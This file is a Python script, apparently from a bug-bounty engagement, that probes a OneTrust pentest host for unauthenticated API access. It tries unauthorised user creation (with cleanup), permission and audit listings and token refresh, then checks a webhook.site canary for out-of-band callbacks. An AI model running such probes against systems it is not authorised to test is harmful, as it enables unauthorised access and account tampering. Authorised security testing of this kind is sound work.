import json, urllib.request, urllib.error, os

BASE = "https://pentest-app.onetrust.com"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
      "Accept": "application/json"}
OUT = []
ZERO = "00000000-0000-0000-0000-000000000000"

def call(name, method, path, body=None, form=None):
    url = BASE + path
    data = None
    hdr = dict(UA)
    if body is not None:
        data = json.dumps(body).encode()
        hdr["Content-Type"] = "application/json"
    if form is not None:
        data = form.encode()
        hdr["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdr, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            b = r.read().decode("utf-8", "replace")
            status = r.status
    except urllib.error.HTTPError as e:
        b = e.read().decode("utf-8", "replace")
        status = e.code
    except Exception as e:
        OUT.append({"name": name, "transport_error": str(e)[:120]})
        print("PROBE", name, "TRANSPORT_ERROR", str(e)[:120], flush=True)
        return None, ""
    OUT.append({"name": name, "status": status, "body": b})
    print("PROBE", name, status, "len", len(b), "head", b[:110].replace("\n", " "), flush=True)
    return status, b

print("START ot_unauth3", flush=True)

call("formula_eval_noauth", "POST", "/api/formula-evaluator/v1/formula-data-points", body={"formulaDataPoints": []})
call("nats_meta_noauth", "POST", "/api/nats-jwt-issuer/v1/meta", body={})
call("login_history_noauth", "GET", "/api/access/v1/login-history")
st, b = call("create_user_noauth", "POST", "/api/access/v2/users",
             body={"userName": "moka-ot-unauth-probe@bugcrowdninja.com", "active": False})
if st and 200 <= st < 300:
    print("ALERT create_user_noauth SUCCEEDED - attempting cleanup", flush=True)
    try:
        uid = json.loads(b).get("id") or json.loads(b).get("userId") or ""
    except Exception:
        uid = ""
    if uid:
        call("create_user_cleanup", "DELETE", "/api/access/v2/users/" + str(uid))
call("audit_activities_noauth", "GET", "/api/audit/v1/users/" + ZERO + "/activities")
call("dsr_language_noauth", "GET", "/api/datasubject/v2/requestqueues/" + ZERO + "/language/en")
call("assertions_noauth", "POST", "/api/document/v4/attachments/assertions", body={})
call("token_refresh_garbage", "POST", "/api/access/v1/oauth/token",
     form="grant_type=refresh_token&refresh_token=invalid-probe-value&client_id=onetrust")
call("dropdown_all_users_noauth", "GET", "/api/access/v1/drop-downs/all-users")
call("permissions_noauth", "GET", "/api/access/v1/permissions")

try:
    req = urllib.request.Request("https://webhook.site/token/e54a86c8-4b18-4d98-90a0-45a460cdcd00/requests",
                                 headers={"User-Agent": UA["User-Agent"]})
    with urllib.request.urlopen(req, timeout=20) as r:
        d = json.loads(r.read().decode())
    print("CANARY total requests:", d.get("total"), flush=True)
except Exception as e:
    print("CANARY check failed:", str(e)[:100], flush=True)

os.makedirs("outputs", exist_ok=True)
with open("outputs/ot_unauth3.json", "w") as f:
    json.dump(OUT, f, indent=1)
print("DONE ot_unauth3", flush=True)
